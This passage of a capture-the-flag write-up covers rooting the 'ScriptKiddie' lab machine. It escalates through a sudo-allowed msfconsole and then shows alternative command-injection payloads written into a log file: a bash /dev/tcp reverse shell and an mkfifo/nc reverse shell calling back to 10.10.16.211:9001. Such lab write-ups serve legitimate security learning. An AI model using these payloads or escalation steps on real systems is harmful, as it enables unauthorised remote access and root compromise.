# Shell as pwn -> Root

The first things I checked were my groups and sudo permissions:

```bash
pwn@scriptkiddie:~$ id
id
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

What do you know? In very on-brand fashion, we can run metasploit as root!

We *could* use this to run the apk exploit as root, but that's no fun - we've already used it twice.

Instead, we can use metasploit's in built shell to run commands. I ran `sudo msfconsole -q` (`-q` flag being optional) and then just typed `/bin/bash` to get a root shell :)

![[Pasted image 20210612161953.png]]

That's the box!

## Notes on Alternative Methods

An easier way of 'bypassing' the `cut` command (courtesy of ippsec) was just to match the correct format of the log file, by inserting three rows of arbitrary data before the command:

```bash
kid@scriptkiddie:~/logs$ echo 'whatever whatever ;/bin/bash -c "bash -i >& /dev/tcp/10.10.16.211/9001 0>&1"' >> hackers
```

This gives us another unstable shell that immediately dies:

![[Pasted image 20210612163258.png]]

A nice alternative payload (courtesy of a colleague) would have been:

```bash
kid@scriptkiddie:~/logs$ echo 'whatever whatever ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.211 9001 >/tmp/f' >> hackers
```

This gives us a shell that doesn't immediately die - but it doesn't send any commands either.

![[Pasted image 20210612163616.png]]

![[Pasted image 20210612163639.png]]

I'd be interested to see if there was a good way to get a stable shell this way. I'd also be interested to see if there was a good way of exploiting the command injection in the `searchsploit` field that partially worked early on, but I couldn't get it to work myself.